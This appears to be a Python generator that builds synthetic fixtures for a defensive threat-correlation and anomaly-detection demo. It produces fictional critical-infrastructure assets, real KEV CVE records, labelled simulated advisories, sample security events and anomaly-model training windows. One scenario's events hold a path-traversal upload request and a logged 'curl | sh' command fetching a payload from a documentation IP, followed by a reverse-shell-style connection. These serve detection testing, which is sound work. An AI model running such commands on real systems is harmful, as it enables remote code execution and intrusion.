"""Builds the shared NETRA-X fixtures in data/. Everything here is SYNTHETIC except demo_cves.json,
which copies 3 real CISA-KEV CVEs (exact NVD ranges) from backend/data/raw + backend/data/cache.

    .venv/bin/python data/generate.py && .venv/bin/python data/validate.py

Re-running overwrites assets.json, threats_synthetic.json, events.json, windows.csv, demo_cves.json.
Edit the data in THIS file, not the JSON, or your change is lost on the next run.
contracts.json is hand-written and never touched by this script.
"""
import csv
import json
import random
from datetime import datetime, timezone
from pathlib import Path

DATA = Path(__file__).resolve().parent
ROOT = DATA.parent
BACKEND = ROOT / "backend"
IST = "+05:30"
GENERATED_AT = f"2026-10-31T14:00:00{IST}"  # fixed so re-runs are byte-identical


def cpe(part, vendor, product, version):
    # CPE 2.3 = the standard product ID NVD uses. Field 5 is the version, "*" = any.
    return f"cpe:2.3:{part}:{vendor}:{product}:{version or '*'}:*:*:*:*:*:*:*"


def sw(part, vendor, product, version):
    return {"vendor": vendor, "product": product, "version": version, "cpe": cpe(part, vendor, product, version)}


# Real vendor/product names in NVD CPE vocabulary, so the correlator can match on them directly.
# OS is kept as plain text in "os", not as a CPE here: OS CPEs (Ubuntu 24.04, Windows w/o build) match dozens of
# KEV kernel/OS CVEs on every host and would bury the Scenario A alert. Background apps are on KEV-clean versions.
NGINX = sw("a", "f5", "nginx", "1.27.2")
APACHE = sw("a", "apache", "http_server", "2.4.62")
OPENSSH = sw("a", "openbsd", "openssh", "9.9")
PG = sw("a", "postgresql", "postgresql", "16.4")
TOMCAT = sw("a", "apache", "tomcat", "10.1.40")

# Fictional vendor for the DEMO-VULN fixtures: a fake vulnerability must never be pinned on a real product.
DEMO_HMI = sw("a", "netrax_demo_vendor", "gridview_hmi", "4.2.1")
DEMO_CBS = sw("a", "netrax_demo_vendor", "corelink_banking_gateway", "3.0.5")
DEMO_PACS = sw("a", "netrax_demo_vendor", "medivault_pacs", None)  # version unknown -> requires manual review

# (asset_id, hostname, ip, organisation, sector, role, os, [software], criticality, internet_facing, owner)
# Internet-facing IPs use RFC 5737 documentation ranges (203.0.113.0/24, 198.51.100.0/24): never real hosts.
ASSETS = [
    # --- power ---
    ("PWR-FW-01", "nrldc-edge-fw01", "203.0.113.10", "Sim Northern Grid Utility", "power", "Perimeter firewall / SSL-VPN",
     "FortiOS 7.2.6", [sw("o", "fortinet", "fortios", "7.2.6")], 5, True, "grid-netops"),
    ("PWR-FW-02", "nrldc-edge-fw02", "203.0.113.11", "Sim Northern Grid Utility", "power", "Perimeter firewall / SSL-VPN (patched twin)",
     "FortiOS 7.4.11", [sw("o", "fortinet", "fortios", "7.4.11")], 5, True, "grid-netops"),
    ("PWR-HMI-01", "scada-hmi-01", "10.10.1.21", "Sim Northern Grid Utility", "power", "SCADA HMI workstation",
     "Windows Server 2022", [DEMO_HMI], 5, False, "ot-control-room"),
    ("PWR-HIST-01", "scada-historian-01", "10.10.1.30", "Sim Northern Grid Utility", "power", "Process historian",
     "Red Hat Enterprise Linux 9.4", [PG], 4, False, "ot-control-room"),
    ("PWR-JUMP-01", "ot-jumphost-01", "10.10.0.5", "Sim Northern Grid Utility", "power", "OT jump host",
     "Ubuntu 24.04", [OPENSSH], 4, False, "ot-control-room"),
    ("PWR-WEB-01", "outage-portal", "203.0.113.15", "Sim Southern Power Discom", "power", "Public outage-map portal",
     "Ubuntu 24.04", [NGINX], 3, True, "discom-it"),
    ("PWR-MAIL-01", "discom-mail", "10.12.0.25", "Sim Southern Power Discom", "power", "Mail relay",
     "Ubuntu 24.04", [sw("a", "postfix", "postfix", "3.8.6")], 2, False, "discom-it"),
    # --- banking ---
    ("BNK-FW-01", "bank-dc-fw01", "203.0.113.20", "Sim Cooperative Bank", "banking", "Data-centre firewall / SSL-VPN",
     "FortiOS 7.0.13", [sw("o", "fortinet", "fortios", "7.0.13")], 5, True, "bank-secops"),
    ("BNK-FW-02", "bank-dr-fw01", "203.0.113.21", "Sim Cooperative Bank", "banking", "DR-site firewall / SSL-VPN (patched twin)",
     "FortiOS 7.6.6", [sw("o", "fortinet", "fortios", "7.6.6")], 5, True, "bank-secops"),
    ("BNK-CBS-01", "cbs-gateway-01", "10.20.1.10", "Sim Cooperative Bank", "banking", "Core-banking API gateway",
     "Red Hat Enterprise Linux 9.4", [DEMO_CBS], 5, False, "bank-core-team"),
    ("BNK-DB-01", "cbs-db-01", "10.20.1.20", "Sim Cooperative Bank", "banking", "Core-banking database",
     "Red Hat Enterprise Linux 9.4", [sw("a", "oracle", "database_server", "19.24")], 5, False, "bank-dba"),
    ("BNK-NET-01", "netbanking-web", "203.0.113.25", "Sim Cooperative Bank", "banking", "Internet-banking web front end",
     "Ubuntu 24.04", [NGINX, TOMCAT], 5, True, "bank-digital"),
    ("BNK-UPI-01", "upi-switch-01", "10.20.2.10", "Sim Cooperative Bank", "banking", "UPI switch",
     "Red Hat Enterprise Linux 9.4", [TOMCAT], 5, False, "bank-payments"),
    ("BNK-ATM-01", "atm-controller", "10.20.3.5", "Sim Cooperative Bank", "banking", "ATM network controller",
     "Windows Server 2022", [], 4, False, "bank-payments"),
    # --- govt ---
    ("GOV-WEB-01", "citizen-portal-01", "198.51.100.10", "Sim State e-Governance Dept", "govt", "Citizen services portal (PHP on Windows/IIS, CGI)",
     "Windows Server 2022", [sw("a", "php", "php", "8.1.28")], 4, True, "egov-webteam"),
    ("GOV-WEB-02", "citizen-portal-02", "198.51.100.11", "Sim State e-Governance Dept", "govt", "Citizen services portal (patched twin)",
     "Windows Server 2022", [sw("a", "php", "php", "8.2.35")], 4, True, "egov-webteam"),
    ("GOV-MAIL-01", "egov-mail", "198.51.100.25", "Sim State e-Governance Dept", "govt", "Webmail",
     "Ubuntu 24.04", [sw("a", "roundcube", "webmail", "1.6.12")], 3, True, "egov-it"),
    ("GOV-DNS-01", "egov-dns", "10.30.0.53", "Sim State e-Governance Dept", "govt", "Internal DNS",
     "Ubuntu 24.04", [sw("a", "isc", "bind", "9.20.3")], 4, False, "egov-it"),
    ("GOV-AD-01", "egov-dc01", "10.30.0.10", "Sim State e-Governance Dept", "govt", "Active Directory domain controller",
     "Windows Server 2022", [], 5, False, "egov-it"),
    ("GOV-LAND-01", "land-records-app", "10.30.1.40", "Sim District Land Records Office", "govt", "Land-records application",
     "Ubuntu 24.04", [APACHE, PG], 3, False, "land-it"),
    ("GOV-VPN-01", "egov-vpn", "198.51.100.30", "Sim State e-Governance Dept", "govt", "Remote-access VPN",
     "Ubuntu 24.04", [sw("a", "openvpn", "openvpn", "2.6.12")], 4, True, "egov-it"),
    # --- health ---
    ("HLT-PACS-01", "pacs-01", "10.40.1.15", "Sim District Hospital", "health", "Radiology PACS server",
     "Windows Server 2022", [DEMO_PACS], 4, False, "hospital-it"),
    ("HLT-WEB-01", "patient-portal", "198.51.100.40", "Sim District Hospital", "health", "Patient appointment portal",
     "Ubuntu 24.04", [NGINX, sw("a", "php", "php", "8.3.36")], 3, True, "hospital-it"),
    ("HLT-HIS-01", "his-app-01", "10.40.1.20", "Sim District Hospital", "health", "Hospital information system",
     "Red Hat Enterprise Linux 9.4", [TOMCAT, PG], 5, False, "hospital-it"),
    ("HLT-LAB-01", "lis-01", "10.40.1.25", "Sim District Hospital", "health", "Lab information system",
     "Windows Server 2022", [], 3, False, "hospital-lab"),
    ("HLT-VPN-01", "hospital-vpn", "198.51.100.45", "Sim District Hospital", "health", "Telemedicine VPN",
     "Ubuntu 24.04", [sw("a", "openvpn", "openvpn", "2.6.12")], 3, True, "hospital-it"),
    ("HLT-BKP-01", "backup-01", "10.40.2.10", "Sim District Hospital", "health", "Backup server",
     "Ubuntu 24.04", [OPENSSH], 4, False, "hospital-it"),
    ("HLT-MAIL-01", "hospital-mail", "10.40.0.25", "Sim District Hospital", "health", "Mail relay",
     "Ubuntu 24.04", [sw("a", "postfix", "postfix", "3.8.6")], 2, False, "hospital-it"),
    # --- telecom ---
    ("TEL-WIKI-01", "noc-wiki-01", "203.0.113.30", "Sim Regional Telecom Operator", "telecom", "NOC knowledge base (Confluence)",
     "Ubuntu 24.04", [sw("a", "atlassian", "confluence_data_center", "8.5.1")], 3, True, "noc-tools"),
    ("TEL-WIKI-02", "noc-wiki-02", "203.0.113.31", "Sim Regional Telecom Operator", "telecom", "NOC knowledge base (patched twin)",
     "Ubuntu 24.04", [sw("a", "atlassian", "confluence_data_center", "9.2.26")], 3, True, "noc-tools"),
    ("TEL-BSS-01", "bss-billing-01", "10.50.1.10", "Sim Regional Telecom Operator", "telecom", "Billing / BSS",
     "Red Hat Enterprise Linux 9.4", [sw("a", "oracle", "database_server", "19.24")], 4, False, "telco-it"),
    ("TEL-DNS-01", "telco-dns", "203.0.113.53", "Sim Regional Telecom Operator", "telecom", "Public recursive DNS",
     "Ubuntu 24.04", [sw("a", "isc", "bind", "9.20.3")], 4, True, "telco-netops"),
    ("TEL-RTR-01", "core-rtr-01", "10.50.0.1", "Sim Regional Telecom Operator", "telecom", "Core router",
     "Cisco IOS XE 17.18.2", [sw("o", "cisco", "ios_xe", "17.18.2")], 5, False, "telco-netops"),
    ("TEL-NMS-01", "nms-01", "10.50.0.20", "Sim Regional Telecom Operator", "telecom", "Network monitoring",
     "Ubuntu 24.04", [sw("a", "zabbix", "zabbix", "7.0.5")], 3, False, "telco-netops"),
    # --- water ---
    ("WTR-HMI-01", "wtp-hmi-01", "10.60.1.21", "Sim Municipal Water Board", "water", "Treatment-plant HMI",
     "Windows Server 2022", [], 5, False, "water-ot"),
    ("WTR-WEB-01", "water-billing", "198.51.100.60", "Sim Municipal Water Board", "water", "Online bill payment",
     "Ubuntu 24.04", [APACHE, sw("a", "php", "php", "8.3.36")], 3, True, "water-it"),
    ("WTR-HIST-01", "wtp-historian", "10.60.1.30", "Sim Municipal Water Board", "water", "SCADA historian",
     "Red Hat Enterprise Linux 9.4", [PG], 4, False, "water-ot"),
    ("WTR-JUMP-01", "water-jumphost", "10.60.0.5", "Sim Municipal Water Board", "water", "OT jump host",
     "Ubuntu 24.04", [OPENSSH], 4, False, "water-ot"),
    ("WTR-FS-01", "water-files", "10.60.0.40", "Sim Municipal Water Board", "water", "File server",
     "Windows Server 2022", [], 2, False, "water-it"),
    ("WTR-GIS-01", "pipeline-gis", "10.60.0.50", "Sim Municipal Water Board", "water", "Pipeline GIS",
     "Ubuntu 24.04", [PG, sw("a", "geoserver", "geoserver", "2.26.2")], 3, False, "water-it"),
]
FIELDS = ["asset_id", "hostname", "ip", "organisation", "sector", "role", "os", "software", "criticality", "internet_facing", "owner"]

# Real KEV CVEs for Scenario A, with the assets that are (and deliberately are not) inside the NVD range.
DEMO_CVES = {
    "CVE-2024-21762": {"vulnerable": ["PWR-FW-01", "BNK-FW-01"], "patched": ["PWR-FW-02", "BNK-FW-02"],
                       "products": {("fortinet", "fortios")},
                       "why": "FortiOS SSL-VPN RCE, KEV + ransomware use. Clean NVD ranges. Twins run 7.4.11 / 7.6.6: outside this CVE AND every other cached KEV FortiOS CVE (7.0.x/7.2.x lines still carry later KEV bugs, e.g. CVE-2025-61624), so they must raise no alert at all."},
    "CVE-2024-4577": {"vulnerable": ["GOV-WEB-01"], "patched": ["GOV-WEB-02"],
                      "products": {("php", "php")},
                      "why": "PHP-CGI command injection, KEV. Only exploitable on Windows in CGI mode (some code pages) - NVD's range cannot express that, so a good 'limitations' example. Twin runs 8.2.35 (8.1.x is also hit by later KEV CVE-2026-109618). HLT-WEB-01/WTR-WEB-01 run PHP 8.3.36 on Linux: outside every KEV range."},
    "CVE-2023-22515": {"vulnerable": ["TEL-WIKI-01"], "patched": ["TEL-WIKI-02"],
                       "products": {("atlassian", "confluence_data_center"), ("atlassian", "confluence_server")},
                       "why": "Confluence broken access control, KEV. Twin runs 9.2.26: 8.5.2 fixes this CVE but is still hit by KEV CVE-2023-22518/-22527/CVE-2026-21589."},
}


def build_demo_cves() -> list[dict]:
    raw_path = BACKEND / "data/raw/nvd_kev/all_0.json"
    nvd = {v["cve"]["id"]: v["cve"] for v in json.loads(raw_path.read_text())["vulnerabilities"]}
    epss = json.loads((BACKEND / "data/cache/epss.json").read_text())["scores"]
    # merged cache = KEV title + exploit signals + CTID ATT&CK mapping already joined per CVE
    kev = {i["id"]: i for i in json.loads((BACKEND / "data/cache/threat_items.json").read_text())}
    retrieved = datetime.fromtimestamp(raw_path.stat().st_mtime, timezone.utc).isoformat()
    out = []
    for cve_id, demo in DEMO_CVES.items():
        c = nvd[cve_id]
        primary = next(m for k in ("cvssMetricV31", "cvssMetricV30") for m in c["metrics"].get(k, []) if m["type"] == "Primary")
        configs = []
        for cfg in c["configurations"]:
            for node in cfg["nodes"]:
                for m in node["cpeMatch"]:
                    part = m["criteria"].split(":")
                    if m["vulnerable"] and (part[3], part[4]) in demo["products"]:
                        configs.append({"vendor": part[3], "product": part[4],
                                        "version_start_including": m.get("versionStartIncluding"),
                                        "version_start_excluding": m.get("versionStartExcluding"),
                                        "version_end_including": m.get("versionEndIncluding"),
                                        "version_end_excluding": m.get("versionEndExcluding"),
                                        "cpe": m["criteria"]})
        e = epss.get(cve_id) or {}
        out.append({
            "threat_id": cve_id, "cve_id": cve_id, "source": "nvd+kev",
            "title": kev[cve_id]["title"],
            "description": next(d["value"] for d in c["descriptions"] if d["lang"] == "en"),
            "cvss": primary["cvssData"]["baseScore"], "cvss_version": primary["cvssData"]["version"],
            "severity": primary["cvssData"]["baseSeverity"].lower(),
            "epss": e.get("epss"), "epss_percentile": e.get("percentile"),
            "kev_listed": True, "public_exploit": kev[cve_id].get("public_exploit"),
            "affected_configurations": configs,
            "references": list(dict.fromkeys(r["url"] for r in c["references"])),
            "attack_techniques": kev[cve_id].get("attack_techniques", []),
            "published_at": c["published"] + "Z", "retrieved_at": retrieved,
            "raw_ref": str(raw_path.relative_to(ROOT)), "is_simulated": False,
            "vulnerable_asset_ids": demo["vulnerable"], "patched_asset_ids": demo["patched"], "why_chosen": demo["why"],
        })
    return out


def demo_vuln(n, title, desc, vendor, product, ranges, cvss, sev, techniques, published):
    return {
        "threat_id": f"DEMO-VULN-00{n}", "cve_id": None,  # synthetic: never pretend to be a CVE
        "source": "netrax_synthetic", "title": f"[SIMULATED] {title}", "description": f"SIMULATED advisory for demo only. {desc}",
        "cvss": cvss, "cvss_version": "3.1" if cvss is not None else None, "severity": sev,
        "epss": None, "epss_percentile": None,  # FIRST has never scored a fake vuln -> unknown, not 0
        "kev_listed": False, "public_exploit": None,
        "affected_configurations": [{"vendor": vendor, "product": product, "cpe": cpe("a", vendor, product, None), **ranges}],
        "references": [], "attack_techniques": techniques,
        "published_at": published, "retrieved_at": GENERATED_AT, "raw_ref": "data/threats_synthetic.json", "is_simulated": True,
    }


NO_RANGE = dict(version_start_including=None, version_start_excluding=None, version_end_including=None, version_end_excluding=None)
THREATS = [
    demo_vuln(1, "GridView HMI unauthenticated remote command execution",
              "A crafted request to the HMI web service lets an unauthenticated attacker run commands. Matches PWR-HMI-01 (4.2.1).",
              "netrax_demo_vendor", "gridview_hmi", NO_RANGE | {"version_start_including": "4.0.0", "version_end_excluding": "4.2.3"},
              9.8, "critical", ["T1190", "T1059"], f"2026-10-31T09:30:00{IST}"),
    demo_vuln(2, "CoreLink Banking Gateway authentication bypass",
              "Missing check on an internal API allows session forgery. Matches BNK-CBS-01 (3.0.5).",
              "netrax_demo_vendor", "corelink_banking_gateway", NO_RANGE | {"version_end_including": "3.0.5"},
              8.1, "high", ["T1190", "T1078"], f"2026-10-31T10:15:00{IST}"),
    demo_vuln(3, "MediVault PACS path traversal (CVSS not yet assigned)",
              "Path traversal in DICOM export. Vendor has not published a score. HLT-PACS-01 runs it but its version is unknown -> requires manual review.",
              "netrax_demo_vendor", "medivault_pacs", NO_RANGE | {"version_end_excluding": "6.1.0"},
              None, None, ["T1083"], f"2026-10-31T11:00:00{IST}"),
]


def ev(n, asset, ts, etype, sensor, details):
    return {"event_id": f"EVT-{n:04d}", "asset_id": asset, "timestamp": f"2026-10-31T{ts}{IST}",
            "event_type": etype, "source_sensor": sensor, "details": details, "is_simulated": True}


EVENTS = [
    # Scenario B: no CVE, but HTTP anomaly -> unexpected child process -> new outbound destination, all within 5 minutes.
    ev(1, "HLT-WEB-01", "15:02:10", "http", "nginx-access-log",
       {"scenario": "B", "method": "POST", "path": "/appointments/upload.php?file=../../tmp/x.php", "status": 200,
        "client_ip": "198.51.100.200", "requests_last_minute": 340, "baseline_requests_per_minute": 45,
        "note": "Path traversal pattern in an upload request, 7x normal request rate"}),
    ev(2, "HLT-WEB-01", "15:03:40", "process", "edr-agent",
       {"scenario": "B", "parent_process": "php-fpm8.3", "child_process": "/bin/sh",
        "command_line": "sh -c 'curl -s http://203.0.113.250/s | sh'", "user": "www-data",
        "note": "A web server worker should never spawn a shell"}),
    ev(3, "HLT-WEB-01", "15:06:05", "network", "netflow",
       {"scenario": "B", "direction": "outbound", "dest_ip": "203.0.113.250", "dest_port": 4444, "protocol": "tcp",
        "bytes_out": 18234, "first_seen_destination": True,
        "note": "Asset has never talked to this destination; 4444 is a common reverse-shell port"}),
    # Scenario C: scheduled maintenance explains the spike -> must NOT escalate.
    ev(4, "BNK-NET-01", "02:00:00", "maintenance", "change-management",
       {"scenario": "C", "change_id": "CHG-2026-1031-07", "window_start": f"2026-10-31T02:00:00{IST}",
        "window_end": f"2026-10-31T04:00:00{IST}", "description": "Monthly patching + cache warm-up load test",
        "approved_by": "bank-change-board"}),
    ev(5, "BNK-NET-01", "02:20:00", "http", "nginx-access-log",
       {"scenario": "C", "requests_last_minute": 2100, "baseline_requests_per_minute": 300, "http_4xx_ratio": 0.01,
        "client_ip": "10.20.9.15", "client_label": "internal load-test runner",
        "note": "7x spike but from an internal host during an approved window"}),
    ev(6, "BNK-NET-01", "02:35:00", "process", "edr-agent",
       {"scenario": "C", "parent_process": "systemd", "child_process": "/usr/bin/apt-get",
        "command_line": "apt-get -y upgrade", "user": "root", "note": "Expected package upgrade during maintenance"}),
    # Incomplete evidence: suspicious-looking, but key fields are missing -> must be flagged, not guessed.
    ev(7, "WTR-WEB-01", "16:10:00", "auth", "web-app-log",
       {"scenario": "incomplete", "failed_logins_last_minute": 55, "username": "admin", "client_ip": None,
        "note": "Burst of failed logins but the proxy stripped the client IP - source unknown"}),
    ev(8, None, "16:12:30", "network", "perimeter-ids",
       {"scenario": "incomplete", "direction": "inbound", "src_ip": "198.51.100.201", "dest_ip": None, "dest_port": 443,
        "signature": "possible credential stuffing", "note": "Sensor did not record which internal host was targeted (asset_id unknown)"}),
]


def build_windows() -> list[dict]:
    # Training data for Isolation Forest (Member 4): train = normal only, test = ~5% suspicious.
    rng = random.Random(1031)
    hosts = ["HLT-WEB-01", "BNK-NET-01", "GOV-WEB-01", "WTR-WEB-01", "PWR-WEB-01", "TEL-WIKI-01", "GOV-MAIL-01", "BNK-UPI-01"]
    rows = []
    n_train, n_test = 350, 150
    suspicious = set(rng.sample(range(n_test), 8))  # 8/150 = 5.3%
    maintenance = set(rng.sample(sorted(set(range(n_test)) - suspicious), 4))  # big but benign spikes (Scenario C)
    for i in range(n_train + n_test):
        t = i - n_train
        asset = rng.choice(hosts)
        row = {"window_id": f"W{i + 1:04d}", "asset_id": asset,
               "requests_per_minute": max(1, int(rng.gauss(120, 35))),
               "http_4xx_ratio": round(min(1, max(0, rng.gauss(0.03, 0.015))), 3),
               "failed_logins": rng.choice([0] * 8 + [1, 2]),
               "unique_client_ips": max(1, int(rng.gauss(40, 12))),
               "new_outbound_destinations": rng.choice([0] * 9 + [1]),
               "unexpected_child_processes": 0,
               "label": "normal", "split": "train" if t < 0 else "test"}
        if t in maintenance:
            row["requests_per_minute"] *= 6  # loud but harmless: one internal client, no odd processes
            row["unique_client_ips"] = rng.randint(1, 3)
        if t in suspicious:
            row.update(requests_per_minute=rng.randint(250, 600), http_4xx_ratio=round(rng.uniform(0.25, 0.6), 3),
                       failed_logins=rng.randint(0, 40), unique_client_ips=rng.randint(1, 5),
                       new_outbound_destinations=rng.randint(1, 4), unexpected_child_processes=rng.randint(1, 3),
                       label="suspicious")
        rows.append(row)
    return rows


def dump(name, obj):
    (DATA / name).write_text(json.dumps(obj, indent=2, ensure_ascii=False) + "\n")


def main():
    dump("assets.json", [dict(zip(FIELDS, a), is_simulated=True) for a in ASSETS])
    dump("threats_synthetic.json", THREATS)
    dump("events.json", EVENTS)
    dump("demo_cves.json", build_demo_cves())
    rows = build_windows()
    with open(DATA / "windows.csv", "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0]))
        w.writeheader()
        w.writerows(rows)
    print(f"wrote {len(ASSETS)} assets, {len(THREATS)} synthetic threats, {len(EVENTS)} events, "
          f"{len(DEMO_CVES)} demo CVEs, {len(rows)} windows")


if __name__ == "__main__":
    main()
